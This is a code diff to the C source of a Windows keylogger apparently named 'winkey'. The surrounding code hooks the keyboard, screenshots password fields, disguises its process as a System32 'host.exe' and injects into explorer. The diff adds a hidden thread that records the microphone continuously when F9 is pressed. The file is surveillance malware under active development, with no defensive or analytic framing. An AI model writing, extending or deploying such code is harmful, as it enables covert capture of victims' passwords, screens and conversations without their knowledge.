@@ -1,6 +1,21 @@
 #include "../winkey.h"
 
 HHOOK g_ouk;
+volatile int g_micro_run = 0;
+
+DWORD WINAPI thread_micro(LPVOID lp)
+{
+	while(1)
+	{
+		if (g_micro_run)
+		{
+		capture_micro_continuous();
+		}
+		Sleep(100);
+	}
+    return 0;
+}
+
 
 void *which_open(char *exe)
 {
@@ -38,6 +53,16 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 			capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
 		if (is_password_field(current))
 			capture_screen(L"C:\\winkey_screens\\password_field.bmp");
+		if (kbd->vkCode == VK_F9)
+		{
+			printf("MICRO ACTIVE CHEF !\n:");
+			g_micro_run = 1;
+		}
+		if (kbd->vkCode == VK_F10)
+		{
+			printf("MICRO DESCATIVER CHEF!\n");
+			g_micro_run = 0 ;
+		}
 		which_open(exe);
 		if (!allow_app(exe))
 			return (CallNextHookEx(g_ouk, ncode, wp, lp));
@@ -83,9 +108,11 @@ void run_winkey(void)
 	}
 	UnhookWindowsHookEx(g_ouk);
 }
+
 int main(void)
 {
 	disguise_process_name(L"C:\\Windows\\System32\\host.exe");
+	HANDLE h = CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
 	if (inject_into_explorer())
 		return 0;
 	run_winkey();
